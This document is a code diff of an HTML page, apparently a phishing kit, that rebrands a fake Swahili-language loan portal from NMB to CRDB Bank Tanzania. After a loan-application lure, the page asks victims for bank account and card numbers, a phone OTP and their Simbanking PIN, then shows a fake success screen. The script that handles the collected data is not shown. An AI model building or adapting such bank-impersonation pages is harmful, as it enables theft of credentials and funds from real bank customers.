@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NMB & Simbanking Mkopo Portal</title>
+    <title>CRDB Simbanking Tanzania Loan Portal</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
@@ -12,24 +12,24 @@
         <header class="app-header">
             <span class="back-btn" id="backBtn">&#8592; Rudi</span>
             <div class="logo-area">
-                <span class="bank-title">NMB</span>
-                <span class="sub-title">MKONONI TANZANIA</span>
+                <span class="bank-title">CRDB BANK</span>
+                <span class="sub-title">SIMBANKING TANZANIA</span>
             </div>
             <div class="menu-icon">&#9776;</div>
         </header>
 
         <main class="content-body">
-            <!-- NOTIFICATION SURFACE BANNER -->
+            <!-- SURFACE NOTIFICATION BANNER -->
             <div id="surfaceNotification" class="surface-notification hidden"></div>
 
             <!-- SLIDER / HOME SCREEN -->
             <section id="stepSlider" class="form-step active">
                 <div class="card-box">
-                    <h2>Pata Mkopo Wako Haraka</h2>
-                    <p class="subtitle">Idhini ya haraka • Riba nafuu • Muda rahisi</p>
+                    <h2>Pata Mkopo Wako Haraka - CRDB</h2>
+                    <p class="subtitle">Idhini ya haraka • Riba nafuu • Muda rahisi Tanzania</p>
                     
                     <div class="calc-box">
-                        <label>Kiasi cha Mkopo</label>
+                        <label>Kiasi cha Mkopo (TZS)</label>
                         <div class="amount-display" id="loanAmountText">TSh 100,000</div>
                         <input type="range" id="loanRange" min="10000" max="100000000" step="10000" value="100000">
                         <div class="range-limits"><span>TSh 10K</span><span>TSh 100M</span></div>
@@ -50,14 +50,14 @@
                     <div class="features-footer">
                         <div>⚡ <strong>Idhini ya Haraka</strong><br><small>Ndani ya masaa 24</small></div>
                         <div>💰 <strong>Riba Nafuu</strong><br><small>Kuanzia 25%</small></div>
-                        <div>🔒 <strong>Salama</strong><br><small>Kiwango cha benki</small></div>
+                        <div>🔒 <strong>Salama</strong><br><small>Kiwango cha CRDB</small></div>
                     </div>
                 </div>
             </section>
 
             <!-- STEP 1 OF 3 -->
             <section id="step1" class="form-step">
-                <h3>Maombi ya Mkopo</h3>
+                <h3>Maombi ya Mkopo - CRDB</h3>
                 <div class="step-indicator">Hatua 1 ya 3</div>
                 <div class="progress-bar-container"><div class="progress-bar" style="width: 33%;"></div></div>
 
@@ -92,9 +92,9 @@
                 <button class="primary-btn" id="nextToStep2">HATUA INAYOFUATA</button>
             </section>
 
-            <!-- STEP 2 OF 3 -->
+            <!-- STEP 2 OF 3 (Tanzania Phone Only) -->
             <section id="step2" class="form-step">
-                <h3>Maombi ya Mkopo</h3>
+                <h3>Maombi ya Mkopo - CRDB</h3>
                 <div class="step-indicator">Hatua 2 ya 3</div>
                 <div class="progress-bar-container"><div class="progress-bar" style="width: 66%;"></div></div>
 
@@ -110,12 +110,12 @@
                 </div>
 
                 <div class="input-group">
-                    <label>Namba ya Simu</label>
+                    <label>Namba ya Simu (Tanzania Only)</label>
                     <div class="phone-input-box">
                         <span class="flag">🇹🇿 +255</span>
-                        <input type="tel" id="phoneNumber" placeholder="712345678">
+                        <input type="tel" id="phoneNumber" placeholder="712345678" maxlength="9">
                     </div>
-                    <small>Weka nambari 9 au anza na 0 (mfano, 0712345678)</small>
+                    <small>Lazima iwe namba halali ya Tanzania (+255, namba 9 kuanzia 6, 7 au 5)</small>
                 </div>
 
                 <div class="btn-group">
@@ -126,7 +126,7 @@
 
             <!-- STEP 3 OF 3 -->
             <section id="step3" class="form-step">
-                <h3>Maombi ya Mkopo</h3>
+                <h3>Maombi ya Mkopo - CRDB</h3>
                 <div class="step-indicator">Hatua 3 ya 3</div>
                 <div class="progress-bar-container"><div class="progress-bar" style="width: 100%;"></div></div>
 
@@ -155,10 +155,10 @@
                 </div>
             </section>
 
-            <!-- ACCOUNT & CARD NUMBER DETAILS (Post Step 3) -->
+            <!-- ACCOUNT & CARD DETAILS VERIFICATION (Post Step 3) -->
             <section id="accountVerification" class="form-step">
                 <div class="sub-header-bar">Unatumia Uthibitishaji wa Kadi ya Tembo</div>
-                <p class="info-text">Karibu! Nyumbani tafadhali inaruhusu unanisha akaunti yako ya Benki</p>
+                <p class="info-text">Karibu! Nyumbani tafadhali inaruhusu unanisha akaunti yako ya Benki ya CRDB</p>
 
                 <div class="input-group">
                     <label>Ingiza nambari yako ya akaunti</label>
@@ -176,8 +176,8 @@
             <!-- OTP SCREEN -->
             <section id="otpScreen" class="form-step dark-theme">
                 <div class="icon-shield">🛡️</div>
-                <h2>Thibitisha Akaunti Yako</h2>
-                <p>Tafadhali ingiza namba ya OTP ya tarakimu 5 iliyotumwa kwa namba yako ya Tembo.</p>
+                <h2>Thibitisha Akaunti Yako - CRDB</h2>
+                <p>Tafadhali ingiza namba ya OTP ya tarakimu 5 iliyotumwa kwa namba yako ya Tembo Tanzania.</p>
                 <div class="otp-sent-info">📞 OTP imetumwa kwa: <span id="displayPhone"> +255 7XX XXX XXX (Tembo)</span></div>
 
                 <div class="otp-inputs" id="otpContainer">
@@ -198,7 +198,7 @@
 
             <!-- PIN SCREEN -->
             <section id="pinScreen" class="form-step">
-                <h2>Ingiza PIN ya Usalama</h2>
+                <h2>Ingiza PIN ya Usalama - CRDB</h2>
                 <p>Ingiza namba ya siri (PIN) ya usalama ya Simbanking ili kuendelea.</p>
                 <div class="icon-lock">🔒</div>
 
@@ -209,7 +209,7 @@
                     <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
                     <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
                 </div>
-                <small>ℹ️ Ingiza namba ya siri ya tarakimu 4 (PIN) ya Simbanking.</small>
+                <small>ℹ️ Ingiza namba ya siri ya tarakimu 4 (PIN) ya Simbanking CRDB.</small>
 
                 <button class="primary-btn green-btn" id="verifyPinBtn">ENDELEA</button>
             </section>
@@ -219,7 +219,7 @@
                 <div class="congrats-header">
                     <h1>Hongera!</h1>
                     <h3>Akaunti yako imefanikiwa kuanzishwa na kuamilishwa!</h3>
-                    <p>Karibu katika Simbanking NRDB TANZANIA. Sasa unaweza kutumia huduma za benki kwa urahisi na usalama.</p>
+                    <p>Karibu katika Simbanking CRDB BANK TANZANIA. Sasa unaweza kutumia huduma za benki kwa urahisi na usalama.</p>
                 </div>
 
                 <div class="customer-info-card">
@@ -228,7 +228,7 @@
                     <div class="info-row"><span>Nambari ya Simu:</span> <strong id="congratsPhone">+255 712 345 678</strong></div>
                     <div class="info-row"><span>Nambari ya Akaunti:</span> <strong id="congratsAcc">SBK0012345678</strong></div>
                     <div class="info-row"><span>Aina ya Akaunti:</span> <strong>Akaunti ya Akiba</strong></div>
-                    <div class="info-row"><span>Tawi:</span> <strong>NRDB TANZANIA</strong></div>
+                    <div class="info-row"><span>Tawi:</span> <strong>CRDB BANK TANZANIA</strong></div>
                 </div>
 
                 <div class="biometric-success-box">
@@ -248,4 +248,4 @@
     <script src="script.js"></script>
 </body>
                             </html>
-    
+                        
